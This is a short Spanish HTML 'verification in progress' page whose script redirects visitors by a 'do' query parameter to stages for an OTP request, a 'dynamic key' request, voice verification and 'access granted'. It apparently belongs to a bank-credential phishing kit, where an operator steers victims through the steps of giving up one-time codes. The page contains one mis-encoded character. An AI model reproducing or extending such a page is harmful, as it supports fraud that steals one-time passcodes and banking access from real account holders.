<!DOCTYPE html>
<html>
<head>
  <title>Verificando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body{background:#1a0b3d;color:#fff;text-align:center;padding:100px;font-family:Arial;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}
    .loader{border:16px solid #fff;border-top:16px solid #DA0081;border-radius:50%;width:80px;height:80px;animation:s 1s linear infinite}
    @keyframes s{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <h1>Verificando tu solicitud...</h1>
  <div class="loader"></div>

  <script>
    const url = new URL(location.href);
    const accion = url.searchParams.get('do');
    const msgs = {
      otp: ['Tu clave OTP es: 4821', '/solicitar/'],
      dinamica: ['Pide la clave din√°mica', '/verify-voice/'],
      ok: ['Acceso concedido!', '/successful/']
    };
    if (accion && msgs[accion]) {
      const [msg, to] = msgs[accion];
      document.body.innerHTML = `<h1>${msg}</h1><p>Redirigiendo...</p><div class="loader"></div>`;
      setTimeout(() => location.href = to, 2000);
    }
  </script>
</body>
</html>
